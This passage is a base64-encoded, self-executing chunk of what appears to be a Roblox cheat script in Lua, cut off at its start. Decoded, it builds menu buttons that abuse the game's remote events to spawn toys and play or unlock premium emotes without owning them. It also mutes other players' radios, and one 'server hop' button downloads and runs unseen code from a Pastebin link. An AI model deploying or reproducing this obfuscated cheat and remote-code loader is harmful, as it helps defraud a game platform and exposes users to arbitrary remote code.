vbE5hbWU9IkNvbW1vbkVnZzIwMjQiCmVuZAp0YXNrLndhaXQoMC42KQpsb2NhbCBhcmdzPXtbMV09dG9vbE5hbWV9CmdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SZW1vdGVzLkV4dHJhcy5SZXBsaWNhdGVUb3k6SW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKbG9jYWwgZXF1aXBUb29sPXBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCh0b29sTmFtZSkKaWYgZXF1aXBUb29sIHRoZW4KZXF1aXBUb29sLlBhcmVudD1jaGFyYWN0ZXIKdGFzay53YWl0KDAuNSkKaWYgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvb2xOYW1lKSB0aGVuCmNoYXJhY3Rlclt0b29sTmFtZV0uUGFyZW50PXBsYXllci5CYWNrcGFjawplbmQKZW5kCmVuZCkKZW5kKQpMaWJyYXJ5LmFkZEJ1dHRvbih0YWI3LCAiR2V0IGFsbCB0aGUgZW1vdGVzIiwgIm9idGVuZXIgdG9kb3MgbG9zIGVtb3RlcyIsIGZ1bmN0aW9uKCkKbG9jYWwgcGcgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXI6V2FpdEZvckNoaWxkKCJQbGF5ZXJHdWkiKQpsb2NhbCBlID0gcGc6V2FpdEZvckNoaWxkKCJNYWluR1VJIik6V2FpdEZvckNoaWxkKCJHYW1lIik6RmluZEZpcnN0Q2hpbGQoIkVtb3RlcyIpCgppZiBlIHRoZW4KICAgIGxvY2FsIG9rID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIHJlcXVpcmUoZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLk1vZHVsZXMuRW1vdGVNb2R1bGUpLkdlbmVyYXRlUGFnZSgKICAgICAgICAgICAgeyJoZWFkbGVzcyIsICJ6b21iaWUiLCAiemVuIiwgIm5pbmphIiwgImZsb3NzIiwgImRhYiIsICJzaXQifSwKICAgICAgICAgICAgZSwKICAgICAgICAgICAgIlByZW1pdW0gRW1vdGUgbG9sIgogICAgICAgICkKICAgIGVuZCkKCiAgICBpZiBvayB0aGVuCiAgICAgICAgZ2FtZS5TdGFydGVyR3VpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLCB7CiAgICAgICAgICAgIFRpdGxlID0gIlN1Y2Nlc3MiLAogICAgICAgICAgICBUZXh0ID0gIkVtb3RlcyBvYnRhaW5lZCIsCiAgICAgICAgICAgIER1cmF0aW9uID0gMwogICAgICAgIH0pCiAgICBlbmQKZW5kCmVuZCkKTGlicmFyeS5hZGRCdXR0b24odGFiNywgIk5pbmphIiwgIiIsIGZ1bmN0aW9uKCkKbG9jYWwgUmVtb3RlcyA9IFJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiUmVtb3RlcyIpCiAgICBSZXBsaWNhdGVkU3RvcmFnZS5SZW1vdGVzLk1pc2MuUGxheUVtb3RlOkZpcmUoIm5pbmphIikKZW5kKQoKTGlicmFyeS5hZGRCdXR0b24odGFiNywgIkRhYiIsICIiLCBmdW5jdGlvbigpCmxvY2FsIFJlbW90ZXMgPSBSZXBsaWNhdGVkU3RvcmFnZTpXYWl0Rm9yQ2hpbGQoIlJlbW90ZXMiKQogICAgUmVwbGljYXRlZFN0b3JhZ2UuUmVtb3Rlcy5NaXNjLlBsYXlFbW90ZTpGaXJlKCJkYWIiKQplbmQpCgpMaWJyYXJ5LmFkZEJ1dHRvbih0YWI3LCAiRmxvc3MiLCAiIiwgZnVuY3Rpb24oKQpsb2NhbCBSZW1vdGVzID0gUmVwbGljYXRlZFN0b3JhZ2U6V2FpdEZvckNoaWxkKCJSZW1vdGVzIikKICAgIFJlcGxpY2F0ZWRTdG9yYWdlLlJlbW90ZXMuTWlzYy5QbGF5RW1vdGU6RmlyZSgiZmxvc3MiKQplbmQpCgpMaWJyYXJ5LmFkZEJ1dHRvbih0YWI3LCAiSGVhZGxlc3MiLCAiIiwgZnVuY3Rpb24oKQpsb2NhbCBSZW1vdGVzID0gUmVwbGljYXRlZFN0b3JhZ2U6V2FpdEZvckNoaWxkKCJSZW1vdGVzIikKICAgIFJlcGxpY2F0ZWRTdG9yYWdlLlJlbW90ZXMuTWlzYy5QbGF5RW1vdGU6RmlyZSgiaGVhZGxlc3MiKQplbmQpCgpMaWJyYXJ5LmFkZEJ1dHRvbih0YWI3LCAiWmVuIiwgIiIsIGZ1bmN0aW9uKCkKbG9jYWwgUmVtb3RlcyA9IFJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiUmVtb3RlcyIpClJlcGxpY2F0ZWRTdG9yYWdlLlJlbW90ZXMuTWlzYy5QbGF5RW1vdGU6RmlyZSgiemVuIikKZW5kKQoKTGlicmFyeS5hZGRCdXR0b24odGFiNywgIlpvbWJpZSIsICIiLCBmdW5jdGlvbigpCmxvY2FsIFJlbW90ZXMgPSBSZXBsaWNhdGVkU3RvcmFnZTpXYWl0Rm9yQ2hpbGQoIlJlbW90ZXMiKQpSZXBsaWNhdGVkU3RvcmFnZS5SZW1vdGVzLk1pc2MuUGxheUVtb3RlOkZpcmUoInpvbWJpZSIpCmVuZCkKCkxpYnJhcnkuYWRkQnV0dG9uKHRhYjcsICJTaXQiLCAiIiwgZnVuY3Rpb24oKQpsb2NhbCBSZW1vdGVzID0gUmVwbGljYXRlZFN0b3JhZ2U6V2FpdEZvckNoaWxkKCJSZW1vdGVzIikKICAgIFJlcGxpY2F0ZWRTdG9yYWdlLlJlbW90ZXMuTWlzYy5QbGF5RW1vdGU6RmlyZSgic2l0IikKZW5kKQoKTGlicmFyeS5hZGRCdXR0b24odGFiOCwgIlNhdmUgQ29uZmlnIiwgIkd1YXJkYXIgbGEgY29uZmlndXJhY2nDs24gYWN0dWFsIiwgZnVuY3Rpb24oKQogICAgc2F2ZUNvbmZpZyhzYXZlZENvbmZpZykKZW5kKQoKTGlicmFyeS5hZGRCdXR0b24odGFiOCwgIkRlbGV0ZSBDb25maWciLCAiRWxpbWluYXIgbGEgY29uZmlndXJhY2nDs24gYWN0dWFsIiwgZnVuY3Rpb24oKQogICAgaWYgaXNmaWxlKGNvbmZpZ0ZpbGVOYW1lKSB0aGVuCiAgICAgICAgZGVsZmlsZShjb25maWdGaWxlTmFtZSkKICAgIGVuZAplbmQpCgpnZXRnZW52KCkubSA9IGZhbHNlCgpMaWJyYXJ5LmFkZFRvZ2dsZSh0YWI4LCAiTXV0ZSBSYWRpb3MiLCAiIiwgZmFsc2UsIGZ1bmN0aW9uKHMpCiAgICBnZXRnZW52KCkubSA9IHMKICAgIGZvciBfLCBwIGluIHBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgIGlmIHAgfj0gTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgICAgICBsb2NhbCByID0gcC5DaGFyYWN0ZXIgYW5kIHAuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJSYWRpbyIpCiAgICAgICAgICAgIGxvY2FsIHYgPSByIGFuZCByOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiU291bmQiKQogICAgICAgICAgICBpZiB2IHRoZW4KICAgICAgICAgICAgICAgIHYuVm9sdW1lID0gcyBhbmQgMCBvciAwLjUKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKTGlicmFyeS5hZGRCdXR0b24odGFiOCwgIlJlSm9pbiIsICJSZSB1bmlyc2UiLCBmdW5jdGlvbigpCiAgICBnYW1lOkdldFNlcnZpY2UoJ1RlbGVwb3J0U2VydmljZScpOlRlbGVwb3J0KGdhbWUuUGxhY2VJZCwgUGxyKQplbmQpCkxpYnJhcnkuYWRkQnV0dG9uKHRhYjgsICJTZXJ2ZXIgaG9wIFdpdGggR29vZCBQaW5nIiwgIldhaXQgMyBTZWNvbmRzIEZvciBzZXJ2ZXIgaG9wIiwgZnVuY3Rpb24oKQpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzFSMUQzbkw3IikpKCkKZW5kKQpMaWJyYXJ5LmFkZEJ1dHRvbih0YWI4LCAiU2VydmVyIGhvcCIsICIiLCBmdW5jdGlvbigpIApsb2NhbCB0ZWxlcG9ydFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlRlbGVwb3J0U2VydmljZSIpCnRlbGVwb3J0U2VydmljZTpUZWxlcG9ydChnYW1lLlBsYWNlSWQpCmVuZCkKCnNldGZwc2NhcChtYXRoLmh1Z2UpCnByaW50KCJGcHMgdW5ibG9jayDDlzIiKQ=="))()
